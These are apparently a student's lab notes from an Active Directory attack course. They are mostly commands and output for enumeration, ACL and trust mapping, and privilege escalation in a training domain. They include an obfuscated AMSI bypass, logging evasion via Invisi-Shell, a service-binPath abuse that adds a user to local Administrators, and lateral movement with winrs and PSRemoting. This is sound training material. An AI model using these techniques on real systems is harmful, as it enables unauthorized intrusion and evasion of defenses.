
## Instructions
* All commands is running by PowerView
* Please remember to turn-off or add an exception to your student VMs firewall when your run listener for a reverse shell
* Using Invisi-Shell to avoid enhanced logging
* AMSI bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Objective 1
```
Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators
• Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
• Find a file share where studentx has Write permissions.
```
### Invisi-Shell
* C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

### Return all users or specific user objects in AD
* Get-DomainUser
* Get-DomainUser | select -ExpandProperty samaccountname

### Member computers
* Get-DomainComputer | select -ExpandProperty dnshostname
```
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
```

### Details of the Domain Admins group 
* Get-DomainGroup -Identity "Domain Admins"

### Enumerate members of the Domain Admins group
* Get-DomainGroupMember -Identity "Domain Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

### BloodHound ingestores
* C:\AD\Tools\BloodHound-master\BloodHoundmaster\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL Container,ObjectProps,SPNTargets --excludedcs

### File with all servers
* cat C:\AD\Tools\servers.txt 
```
DCORP-ADMINSRV 
DCORP-APPSRV 
DCORP-CI 
DCORP-MGMT 
DCORP-MSSQL 
DCORP-SQL1
DCORP-STDADMIN
DCORP-STD2
DCORP-STUDENT1
```

### File share where studentx has Write permissions, Use the PowerHuntShares to search for file shares.
* Import-Module C:\AD\Tools\PowerHuntShares.psm1
* Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```
with the top 200 share names.
[*][12/24/2024 04:02] - 2 ADMIN$
[*][12/24/2024 04:02] - 2 C$
[*][12/24/2024 04:02] - 1 studentshare2
[*][12/24/2024 04:02] - 1 AI
[*] -----------------------------------------------
[*][12/24/2024 04:02] - Generating HTML Report
[*][12/24/2024 04:02] - Estimated generation time: 1 minute or less
[*][12/24/2024 04:02] - All files written to C:\AD\Tools\\SmbShareHunt12242024040138
```

<img width="1824" height="583" alt="image" src="https://github.com/user-attachments/assets/e319a78c-39ad-42b8-8e5a-0b87d0f2d866" />


<img width="1563" height="736" alt="image" src="https://github.com/user-attachments/assets/685e06cd-e7a2-429d-b9af-fdf45a05358b" />


## Objective 2:
```
• Enumerate following for the dollarcorp domain:
− ACL for the Domain Admins group
− ACLs where studentx has interesting permissions
• Analyze the permissions for studentx in BloodHound UI
```

### Enumerate ACLs for the Domain Admins Group
* Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

### Check for modify rights/permissions
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"} 
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
ObjectDN : 
CN=ControlxUser,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier : AccessAllowed
ActiveDirectoryRights : GenericAll
ObjectAceType : None
AceFlags : None
AceType : AccessAllowed
InheritanceFlags : None
SecurityIdentifier : S-1-5-21-719815819-3726368948-3917688648-1123
IdentityReferenceName : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN : CN=RDP 
Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass : group
```

### Analyze the permissions for studentx using BloodHound UI
### Let’s look at the 'Outbound Object Control' for the studentx
```
Multiple permissions stand out in the above diagram. Due to the membership of the RDPUsers group, 
the studentx user has following interesting permissions
- Full Control/Generic All over supportx and controlx users. 
- Enrollment permissions on multiple certificate templates.
- Full Control/Generic All on the Applocked Group Policy.
```

![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)

## Objective 3
```
• Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the DevOps OU
− List the GPOs 
− Enumerate GPO applied on the DevOps OU
− Enumerate ACLs for the Applocked and DevOps GPOs
```

### List all the OUs
* Get-DomainOU
* Get-DomainOU | select -ExpandProperty name

### List all the computers in the DevOps OU
* (Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
Domain Controllers
StudentMachines
Applocked
Servers
DevOps
```

### List all the GPOs
* Get-DomainGPO
```
flags : 0
systemflags : -1946157056
displayname : Default Domain Policy
[snip]
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

### Enumerate GPO applied on the DevOps OU (we need the name of the policy from the gplink attribute from the OU)
* (Get-DomainOU -Identity DevOps).gplink
```
LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

### More informations about this GPO
* Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
cn : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged : 314489
dscorepropagationdata : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath : 
\\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8
D01C-1F62-4BDC-958C-57140B67D147}
distinguishedname : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated : 12/18/2024 7:31:22 AM
showinadvancedviewonly : True
usncreated : 293100
gpcfunctionalityversion : 2
instancetype : 4
objectclass : {top, container, groupPolicyContainer}
objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

### To enumerate the ACLs for the Applocked and DevOps GPO, let's use the BloodHound CE UI
![alt text](image-3.png)
![alt text](image-5.png)

**A user named 'devopsadmin' has 'WriteDACL' on DevOps Policy.**

## Objective 4
```
• Enumerate all domains in the moneycorp.local forest. 
• Map the trusts of the dollarcorp.moneycorp.local domain.
• Map External trusts in moneycorp.local forest. 
• Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
```

### Enumerate all domains in the current forest
* Get-ForestDomain -Verbose

### Map all the trusts of the dollarcorp domain
* Get-DomainTrust
```
SourceName : dollarcorp.moneycorp.local
TargetName : moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 5:59:01 AM
WhenChanged : 2/24/2023 9:11:33 AM

SourceName : dollarcorp.moneycorp.local
TargetName : us.dollarcorp.moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 6:22:51 AM
WhenChanged : 2/24/2023 9:09:58 AM

SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### list only the external trusts in the moneycorp.local forest
* Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### Identify external trusts of the dollarcorp domain
*  Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

**Since the above is a Bi-Directional trust, we can extract information from the eurocorp.local forest**
* Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}


## Objective 5
```
• Exploit a service on dcorp-studentx and elevate privileges to local administrator. 
• Identify a machine in the domain where studentx has local administrative access.
• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
```

### Local Privilege Escalation - PowerUp
**We can use Powerup from PowerSploit module to check for any privilege escalation path. Feel free to use other tools mentioned in the class like WinPEAS**

* . C:\AD\Tools\PowerUp.ps1
* Invoke-AllChecks
```
[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
[snip]

[*] Checking service executable and argument permissions...
ServiceName : AbyssWebServer
AlteredSecurity Attacking and Defending Active Directory 35
Path : C:\WebServer\Abyss Web Server\abyssws.exe -
service
ModifiableFile : C:\WebServer\Abyss Web Server
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes, 
Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName : LocalSystem
AbuseFunction : Install-ServiceBinary -Name 
'AbyssWebServer'
CanRestart : True

[snip]
[*] Checking service permissions...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart : True
```

### Abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group

*  Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```
VERBOSE: Service 'AbyssWebServer' original path: 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
VERBOSE: Service 'AbyssWebServer' original state: 'Stopped'
VERBOSE: Executing command 'net localgroup Administrators dcorp\student1 /add'
VERBOSE: binPath for AbyssWebServer successfully set to 'net localgroup Administrators dcorp\studentx /add'
```

**We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!**

### Hunt for Local Admin access

**To identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1**

* . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* Find-PSRemotingLocalAdminAccess
```
dcorp-adminsrv
```

**Studentx has administrative access on dcorp-adminsrv and on the student machine.** 
**We can connect to dcorp-adminsrv using winrs as the student user**

* winrs -r:dcorp-adminsrv cmd
```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

* set username
```
set username
USERNAME=studentx
```

* set computername
```
computername
COMPUTERNAME=dcorp-adminsrv
```

**PowerShell Remoting**
* Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

* [dcorp-adminsrv.dollarcorp.moneycorp.local]C:\Users\studentx\Documents>$env:username
```
dcorp\studentx
```
